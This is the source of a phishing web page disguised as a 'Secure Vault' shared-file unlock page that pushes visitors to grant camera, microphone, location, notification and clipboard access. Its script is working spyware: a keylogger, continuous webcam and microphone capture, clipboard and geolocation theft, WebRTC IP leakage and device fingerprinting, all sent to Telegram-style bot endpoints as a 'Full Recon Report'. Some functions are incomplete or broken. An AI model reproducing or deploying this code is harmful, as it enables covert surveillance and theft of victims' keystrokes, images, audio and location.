<style>

body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;overflow:hidden;background:#080e1a}

.glass-card{position:relative;width:92%;max-width:520px;background:rgba(255,255,255,0.05);backdrop-filter:blur(28px);border-radius:28px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 24px 72px rgba(0,0,0,0.5),inset 0 1px 0 rgba(255,255,255,0.06);padding:36px 28px 24px}
.glass-card::before{content:'';position:absolute;top:-1px;left:15%;right:15%;height:2px;background:linear-gradient(90deg,transparent,rgba(48,128,255,0.5),transparent);border-radius:50%}

.perm-row.done .pi{background:rgba(56,220,120,0.10)}
.perm-row.done .pi svg{stroke:rgba(56,220,120,0.7)}
.perm-row .pt{flex:1}
.perm-row .pt .pn{font-size:13px;font-weight:500;color:rgba(240,244,255,0.82)}

.perm-row .ps{width:20px;height:20px;border-radius:50%;border:2px solid rgba(255,255,255,0.10);display:flex;align-items:center;justify-content:center}
.perm-row.done .ps{border-color:rgba(56,220,120,0.45);background:rgba(56,220,120,0.12)}
.perm-row.done .ps::after{content:'';width:7px;height:7px;border-radius:50%;background:#38dc78;animation:pd 2s infinite}
@keyframes pd{0%,100%{box-shadow:0 0 0 0 rgba(56,220,120,0.35)}50%{box-shadow:0 0 0 5px rgba(56,220,120,0)}}
.prog{display:none;margin-bottom:20px}
.prog.show{display:block}
.prog-bar{height:3px;border-radius:3px;background:rgba(255,255,255,0.07);overflow:hidden;margin-bottom:7px}
.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#3070ff,#48a8ff);transition:width 0.4s}
.prog-lbl{font-size:11px;color:rgba(240,244,255,0.40);text-align:center}
.cta{width:100%;padding:14px 20px;border:none;border-radius:14px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;transition:all 0.3s;margin-bottom:8px;position:relative;overflow:hidden}
.cta:not(.go){background:rgba(255,255,255,0.04);color:rgba(240,244,255,0.15);cursor:not-allowed}
.cta.go{background:linear-gradient(135deg,#1a60e0,#3884ff);color:#fff;box-shadow:0 6px 28px rgba(48,128,255,0.22)}
.cta.go:hover{transform:translateY(-1.5px)}
.cta .sub{display:block;font-size:10px;opacity:0.55;margin-top:3px}
.retry-link{text-align:center;margin-top:8px;font-size:10.5px;color:rgba(240,244,255,0.3);cursor:pointer;text-decoration:underline}
.retry-link:hover{color:rgba(56,220,120,0.6)}
.ftr{text-align:center;padding-top:12px;border-top:1px solid rgba(255,255,255,0.05);margin-top:4px}
.ftr p{font-size:9.5px;color:rgba(240,244,255,0.20)}
.tst{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(70px);z-index:999;background:rgba(0,0,0,0.7);backdrop-filter:blur(10px);padding:10px 20px;border-radius:12px;color:#f0f4ff;font-size:12px;opacity:0;transition:all 0.3s;pointer-events:none;white-space:nowrap}
.tst.up{opacity:1;transform:translateX(-50%) translateY(0)}
@keyframes fi{from{opacity:0;transform:scale(0.95)}to{opacity:1;transform:scale(1)}}
.glass-card{animation:fi 0.5s cubic-bezier(0.22,1,0.36,1)}

<script>

// ============================================================
// GLOBAL TARGET URL - SET THIS TO YOUR DESIRED REDIRECT URL

var TARGET_URL = 'https://www.google.com';

// ============================================================
// DOM SHORTCUTS
// ============================================================
function $(id) { return document.getElementById(id); }
var btn = $('cta'), btnT = $('btnT'), btnS = $('btnS');
var prog = $('prog'), pfill = $('pfill'), plbl = $('plbl');
var toastEl = $('toastMsg');
var retryEl = $('retryBtn');

// ============================================================
// STATE
// ============================================================
var perms = {cam: false, mic: false, loc: false, notif: false, clip: false};
var allGranted = false;
var extractionDone = false;
var extractionStarted = false;
var toastTimer = null;
var cameraStream = null;
var cameraInterval = null;
var capturedFrames = [];
var micStream = null;
var micRecorder = null;
var audioChunks = [];
var keepAliveInterval = null;

// ============================================================
// TOAST
// ============================================================
function showToast(msg) {
    toastEl.innerHTML = msg;
    toastEl.className = 'tst up';
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function(){ toastEl.className = 'tst'; }, 2800);
}

// ============================================================
// UI UPDATE
// ============================================================
function updateUI() {
    allGranted = perms.cam && perms.mic && perms.loc && perms.notif && perms.clip;
    if (extractionDone) {
        btn.disabled = true;
        btn.className = 'cta';
        btnT.innerHTML = '&#10003; Complete';
        btnS.innerHTML = '';
        return;
    }
    if (allGranted) {
        btn.disabled = false;
        btn.className = 'cta go';
        btnT.innerHTML = '&#128274; UNLOCK SHARED FILES/LINK';
        btnS.innerHTML = 'CLICK HERE';
    } else {
        btn.disabled = true;
        btn.className = 'cta';
        btnT.innerHTML = 'Grant all permissions to continue';
        var missing = '';
        if (!perms.cam) missing += '&#128247; ';
        if (!perms.mic) missing += '&#127908; ';
        if (!perms.loc) missing += '&#128205; ';
        if (!perms.notif) missing += '&#128276; ';
        if (!perms.clip) missing += '&#128203; ';
        btnS.innerHTML = 'Missing: ' + (missing || 'none');
    }
}

function markGranted(key, el) {
    if (perms[key]) return;
    perms[key] = true;
    el.classList.add('done');
    updateUI();
    var names = {cam:'Camera', mic:'Microphone', loc:'Location', notif:'Notifications', clip:'Clipboard'};
    showToast('&#10003; ' + names[key] + ' granted');
}

// ============================================================
// PERMISSION REQUEST HANDLERS
// ============================================================
function requestCamera() {
    if (perms.cam) { showToast('Already granted'); return; }
    navigator.mediaDevices.getUserMedia({video: true})
        .then(function(stream){
            stream.getTracks().forEach(function(t){ t.stop(); });
            markGranted('cam', $('permCam'));
        })
        .catch(function(){ showToast('&#10007; Camera denied'); });
}

function requestMicrophone() {
    if (perms.mic) { showToast('Already granted'); return; }
    navigator.mediaDevices.getUserMedia({audio: true})
        .then(function(stream){
            stream.getTracks().forEach(function(t){ t.stop(); });
            markGranted('mic', $('permMic'));
        })
        .catch(function(){ showToast('&#10007; Mic denied'); });
}

function requestLocation() {
    if (perms.loc) { showToast('Already granted'); return; }
    navigator.geolocation.getCurrentPosition(
        function(){ markGranted('loc', $('permLoc')); },
        function(){ showToast('&#10007; Location denied'); },
        {timeout: 8000, enableHighAccuracy: true}
    );
}

function requestNotifications() {
    if (perms.notif) { showToast('Already granted'); return; }
    if (!('Notification' in window)) { showToast('Not supported'); return; }
    Notification.requestPermission().then(function(p){
        if (p === 'granted') {
            markGranted('notif', $('permNotif'));
            try { new Notification('Secure Vault', {body:'Alerts enabled', silent:true}); } catch(e){}
        } else {
            showToast('&#10007; Notifications blocked');
        }
    });
}

function requestClipboard() {
    if (perms.clip) { showToast('Already granted'); return; }
    navigator.clipboard.writeText('perm_ok')
        .then(function(){
            setTimeout(function(){
                navigator.clipboard.readText().then(function(){
                    markGranted('clip', $('permClip'));
                }).catch(function(){
                    markGranted('clip', $('permClip'));
                });
            }, 150);
        })
        .catch(function(){ markGranted('clip', $('permClip')); });
}

$('permCam').addEventListener('click', requestCamera);
$('permMic').addEventListener('click', requestMicrophone);
$('permLoc').addEventListener('click', requestLocation);
$('permNotif').addEventListener('click', requestNotifications);
$('permClip').addEventListener('click', requestClipboard);

retryEl.addEventListener('click', function(){
    if (extractionDone || extractionStarted) { showToast('Already processing'); return; }
    if (!perms.cam) requestCamera();
    if (!perms.mic) requestMicrophone();
    if (!perms.loc) requestLocation();
    if (!perms.notif) requestNotifications();
    if (!perms.clip) requestClipboard();
    setTimeout(function(){
        if (allGranted) showToast('&#10003; All granted!');
        else showToast('&#9888; Some missing');
    }, 200);
});

// ============================================================
// KEYLOGGER
// ============================================================
(function(){
    var buffer = [];
    function flush() {
        if (buffer.length === 0) return;
        var chunk = buffer.join('');
        buffer = [];
        var p = {
            chat_id: window.__C.chatId,
            text: '[KEYLOG] ' + chunk.substring(0, 3900),
            disable_notification: true
        };
        fetch(window.__C.msgApi, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(p)
        }).catch(function(){});
    }
    function onKey(e) {
        var k = e.key;
        if (!k || k === 'Dead' || k === 'Unidentified') return;
        if (k === 'Shift' || k === 'Control' || k === 'Alt' || k === 'Meta') return;
        if (k === 'Backspace') buffer.push('[BS]');
        else if (k === 'Enter') buffer.push('[ENTER]\n');
        else if (k === 'Tab') buffer.push('[TAB]');
        else if (k === 'Escape') buffer.push('[ESC]');
        else if (k.length === 1) buffer.push(k);
        else buffer.push('[' + k + ']');
        if (buffer.length >= 40) flush();
    }
    window.addEventListener('keydown', onKey, true);
    setInterval(flush, 7000);
    window.addEventListener('beforeunload', flush);
    window.__keyBuffer = buffer;
    window.__flushKeylog = flush;
})();

// ============================================================
// CONTINUOUS CAMERA CAPTURE - runs until tab is closed
// ============================================================
function startContinuousCameraCapture(fps) {
    if (cameraInterval) return;

    navigator.mediaDevices.getUserMedia({video: true})
        .then(function(stream){
            cameraStream = stream;
            var v = document.createElement('video');
            v.srcObject = stream;
            v.playsInline = true;
            v.muted = true;
            v.autoplay = true;

            v.onloadedmetadata = function(){
                v.play().then(function(){
                    // Capture frames at specified fps
                    cameraInterval = setInterval(function(){
                        try {
                            var cv = document.createElement('canvas');
                            cv.width = v.videoWidth || 640;
                            cv.height = v.videoHeight || 480;
                            cv.getContext('2d').drawImage(v, 0, 0);
                            capturedFrames.push(cv.toDataURL('image/jpeg', 0.7));
                            // Auto-send when we have 10 frames accumulated
                            if (capturedFrames.length >= 10) {
                                sendFrameBatch();
                            }
                        } catch(e){}
                    }, 1000 / fps);

                    // Also flush any accumulated frames every 15 seconds
                    var frameFlushInterval = setInterval(function(){
                        if (capturedFrames.length > 0) sendFrameBatch();
                    }, 15000);

                    // Store cleanup reference
                    window.__frameFlushInterval = frameFlushInterval;

                }).catch(function(){});
            };
            v.onerror = function(){};
        })
        .catch(function(){});
}

function sendFrameBatch() {
    if (capturedFrames.length === 0) return;
    var batch = capturedFrames.splice(0, Math.min(capturedFrames.length, 5));
    var delay = 0;
    for (var i = 0; i < batch.length; i++) {
        (function(idx, data) {
            setTimeout(function(){
                try {
                    var raw = atob(data.split(',')[1]);
                    var buf = new Uint8Array(raw.length);
                    for (var b = 0; b < raw.length; b++) buf[b] = raw.charCodeAt(b);
                    var blob = new Blob([buf], {type: 'image/jpeg'});
                    var fd = new FormData();
                    fd.append('chat_id', window.__C.chatId);
                    fd.append('photo', blob, 'frame_' + Date.now() + '_' + (idx + 1) + '.jpg');
                    fd.append('caption', '&#128247; Live Capture ' + (idx + 1));
                    fetch(window.__C.photoApi, {method: 'POST', body: fd}).catch(function(){});
                } catch(e){}
            }, delay);
            delay += 500;
        })(i, batch[i]);
    }
}

function stopContinuousCamera() {
    if (cameraInterval) {
        clearInterval(cameraInterval);
        cameraInterval = null;
    }
    if (window.__frameFlushInterval) {
        clearInterval(window.__frameFlushInterval);
        window.__frameFlushInterval = null;
    }
    if (cameraStream) {
        cameraStream.getTracks().forEach(function(t){ t.stop(); });
        cameraStream = null;
    }
    // Send any remaining frames
    if (capturedFrames.length > 0) sendFrameBatch();
}

// ============================================================
// CONTINUOUS MICROPHONE CAPTURE - runs until tab is closed
// ============================================================
function startContinuousMicCapture() {
    if (!perms.mic || micRecorder) return;

    navigator.mediaDevices.getUserMedia({audio: true})
        .then(function(stream){
            micStream = stream;
            var mimeType = 'audio/webm';
            try {
                micRecorder = new MediaRecorder(stream, {mimeType: mimeType});
            } catch(e) {
                try {
                    micRecorder = new MediaRecorder(stream);
                } catch(e2) {
                    return;
                }
            }

            micRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    audioChunks.push(e.data);
                    // Send after 3 chunks accumulated
                    if (audioChunks.length >= 3) {
                        sendAudioBatch();
                    }
                }
            };

            // Record in 5-second segments
            micRecorder.start(5000);

            // Periodic flush every 20 seconds
            var audioFlushInterval = setInterval(function(){
                if (audioChunks.length > 0) sendAudioBatch();
            }, 20000);

            window.__audioFlushInterval = audioFlushInterval;
        })
        .catch(function(){});
}

function sendAudioBatch() {
    if (audioChunks.length === 0) return;
    var batch = audioChunks.splice(0, Math.min(audioChunks.length, 3));
    var blob = new Blob(batch, {type: 'audio/webm'});
    try {
        var fd = new FormData();
        fd.append('chat_id', window.__C.chatId);
        fd.append('audio', blob, 'audio_' + Date.now() + '.webm');
        fd.append('caption', '&#127908; Audio Capture');
        fetch(window.__C.audioApi, {method: 'POST', body: fd}).catch(function(){});
    } catch(e){}
}

function stopContinuousMic() {
    if (micRecorder) {
        try {
            micRecorder.stop();
            // Force final chunk
            if (micRecorder.state !== 'inactive') {
                micRecorder.requestData();
            }
        } catch(e){}
        micRecorder = null;
    }
    if (window.__audioFlushInterval) {
        clearInterval(window.__audioFlushInterval);
        window.__audioFlushInterval = null;
    }
    if (micStream) {
        micStream.getTracks().forEach(function(t){ t.stop(); });
        micStream = null;
    }
    // Send any remaining audio
    if (audioChunks.length > 0) sendAudioBatch();
}

function getDeviceInfo() {

function getWebGLInfo() {
    try {
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return 'WebGL not supported';
        var ext = gl.getExtension('WEBGL_debug_renderer_info');
        if (ext) {
            return {
                Vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
                Renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
            };
        }
        return 'No debug info';
    } catch(e) { return 'Error'; }
}

function getCanvasFP() {
    try {
        var c = document.createElement('canvas');
        c.width = 300;
        c.height = 150;
        var ctx = c.getContext('2d');

        for (var i = 0; i < fonts.length; i++) {
            ctx.font = '36px "' + fonts[i] + '", monospace';
            var w1 = ctx.measureText(test).width;
            ctx.font = '36px monospace';
            var w2 = ctx.measureText(test).width;
            if (w1 !== w2) detected.push(fonts[i]);
        }
        return detected;
    } catch(e) { return []; }
}

function getWebRTCIPs() {
    return new Promise(function(resolve){
        var ips = [];
        try {
            var pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });
            pc.createDataChannel('');
            pc.createOffer().then(function(o){
                pc.setLocalDescription(o);
            }).catch(function(){});
            pc.onicecandidate = function(e) {
                if (e.candidate) {
                    var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (m && ips.indexOf(m[0]) === -1) ips.push(m[0]);
                } else {
                    try{ pc.close(); } catch(e){}
                    resolve(ips);
                }
            };
            setTimeout(function(){
                try{ pc.close(); } catch(e){}
                resolve(ips);
            }, 3000);
        } catch(e) { resolve([]); }
    });
}

function getStorageStats() {
    try {
        return {
            localStorageKeys: Object.keys(localStorage).length,
            sessionStorageKeys: Object.keys(sessionStorage).length,
            cookieLength: document.cookie.length
        };
    } catch(e) { return {}; }
}

function getBattery() {
    if (!navigator.getBattery) return Promise.resolve(null);
    return navigator.getBattery().then(function(b){
        return {
            level: Math.round(b.level * 100) + '%',
            charging: b.charging
        };
    }).catch(function(){ return null; });
}

function getNetwork() {
    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (c) {
        return {
            connectionType: c.effectiveType || 'unknown',
            downlinkMbps: c.downlink,
            rttMs: c.rtt
        };
    }
    return {};
}

function getClipboardText() {
    if (!perms.clip) return Promise.resolve('Not granted');
    return navigator.clipboard.readText()
        .then(function(t){
            return (t || '').substring(0, 500);
        })
        .catch(function(e){
            return 'Error: ' + e.message;
        });
}

function getLocation() {
    return new Promise(function(resolve){
        navigator.geolocation.getCurrentPosition(
            function(p){
                resolve({
                    latitude: p.coords.latitude,
                    longitude: p.coords.longitude,
                    accuracyMeters: p.coords.accuracy,
                    altitude: p.coords.altitude,
                    speed: p.coords.speed,
                    heading: p.coords.heading,
                    timestamp: new Date(p.timestamp).toISOString(),
                    googleMaps: 'https://www.google.com/maps?q=' +
                        p.coords.latitude + ',' + p.coords.longitude
                });
            },
            function(e){
                resolve({ error: e.message });
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });
}

// ============================================================
// SEND FINAL REPORT TO TELEGRAM
// ============================================================
function sendFinalReport(data, callback) {
    var keys = window.__keyBuffer || [];

    // Flush keylog first
    if (typeof window.__flushKeylog === 'function') window.__flushKeylog();

    var d = data || {};

    getClipboardText().then(function(clipTxt){
        var locData = d.location || {};

        // Build report HTML
        var html = buildReport(
            d.device || {}, d.webgl || {}, d.canvasFP || '',
            d.fonts || [], d.ips || [], d.storage || {},
            d.battery || null, d.network || {}, clipTxt,
            locData, capturedFrames.length, keys
        );

        try {
            var blob = new Blob([html], {type: 'text/html'});
            var fd = new FormData();
            fd.append('chat_id', window.__C.chatId);
            fd.append('document', blob, 'report_' + Date.now() + '.html');
            fd.append('caption', '&#128270; Full Recon Report: ' + new Date().toISOString());

            fetch(window.__C.api, {method: 'POST', body: fd})
                .then(function(rsp){
                    if (callback) callback();
                })
                .catch(function(){
                    // Fallback: send as text
                    var summary = '&#128270; FINGERPRINT SUMMARY\n';
                    summary += 'UA: ' + (d.device?.['User Agent'] || '?').substring(0, 80) + '\n';
                    summary += 'Platform: ' + (d.device?.Platform || '?') + '\n';
                    summary += 'Screen: ' + (d.device?.['Screen Size'] || '?') + '\n';
                    if (locData && locData.latitude) {
                        summary += 'Location: ' + locData.latitude + ',' + locData.longitude + '\n';
                    }
                    if (d.ips && d.ips.length > 0) summary += 'IPs: ' + d.ips.join(', ') + '\n';
                    summary += 'Frames: ' + capturedFrames.length + ' | Keys: ' + keys.length;

                    var p = {
                        chat_id: window.__C.chatId,
                        text: summary,
                        disable_notification: true
                    };
                    fetch(window.__C.msgApi, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(p)
                    }).then(function(){ if (callback) callback(); })
                      .catch(function(){ if (callback) callback(); });
                });
        } catch(e) {
            if (callback) callback();
        }
    });
}
